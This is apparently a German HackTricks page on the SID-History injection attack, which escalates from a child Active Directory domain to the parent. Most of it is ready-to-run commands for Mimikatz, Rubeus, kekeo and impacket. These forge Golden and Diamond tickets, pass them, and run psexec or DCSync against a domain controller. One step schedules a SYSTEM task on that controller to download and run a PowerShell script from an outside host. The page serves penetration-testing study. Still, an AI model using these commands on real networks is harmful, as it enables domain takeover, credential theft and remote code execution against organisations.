# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID-History Injection Angriff

Der Fokus des **SID-History Injection Angriffs** liegt darauf, **Benutzermigrationen zwischen Domänen** zu unterstützen und gleichzeitig den Zugriff auf Ressourcen der vorherigen Domäne zu gewährleisten. Dies wird erreicht, indem **der vorherige Sicherheitsbezeichner (SID) des Benutzers in die SID-History** seines neuen Kontos integriert wird. Bemerkenswert ist, dass dieser Prozess manipuliert werden kann, um unbefugten Zugriff zu gewähren, indem der SID einer hochprivilegierten Gruppe (wie Enterprise Admins oder Domain Admins) aus der übergeordneten Domäne zur SID-History hinzugefügt wird. Diese Ausnutzung gewährt Zugriff auf alle Ressourcen innerhalb der übergeordneten Domäne.

Es gibt zwei Methoden, um diesen Angriff auszuführen: durch die Erstellung eines **Golden Ticket** oder eines **Diamond Ticket**.

Um den SID für die Gruppe **"Enterprise Admins"** zu ermitteln, muss zunächst der SID der Root-Domäne gefunden werden. Nach der Identifizierung kann der SID der Enterprise Admins-Gruppe konstruiert werden, indem `-519` an den SID der Root-Domäne angehängt wird. Wenn der SID der Root-Domäne beispielsweise `S-1-5-21-280534878-1496970234-700767426` ist, wäre der resultierende SID für die Gruppe "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.

Sie könnten auch die **Domain Admins**-Gruppen verwenden, die mit **512** enden.

Eine andere Möglichkeit, den SID einer Gruppe der anderen Domäne (zum Beispiel "Domain Admins") zu finden, ist:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Golden Ticket (Mimikatz) mit KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Für weitere Informationen über goldene Tickets siehe:

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
Für weitere Informationen zu Diamond Tickets siehe:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Erhöhen Sie die Berechtigungen auf DA von root oder Enterprise-Admin unter Verwendung des KRBTGT-Hashes der kompromittierten Domäne:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Mit den erlangten Berechtigungen aus dem Angriff können Sie beispielsweise einen DCSync-Angriff in der neuen Domäne ausführen:

{{#ref}}
dcsync.md
{{#endref}}

### Von Linux

#### Manuell mit [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatisch mit [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Dies ist ein Impacket-Skript, das **die Eskalation vom Kind- zum Eltern-Domain automatisiert**. Das Skript benötigt:

- Ziel-Domain-Controller
- Anmeldedaten für einen Admin-Benutzer in der Kind-Domain

Der Ablauf ist:

- Erhält die SID für die Enterprise Admins-Gruppe der Eltern-Domain
- Ruft den Hash für das KRBTGT-Konto in der Kind-Domain ab
- Erstellt ein Golden Ticket
- Meldet sich bei der Eltern-Domain an
- Ruft die Anmeldedaten für das Administrator-Konto in der Eltern-Domain ab
- Wenn der `target-exec`-Schalter angegeben ist, authentifiziert es sich beim Domain-Controller der Eltern-Domain über Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referenzen

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
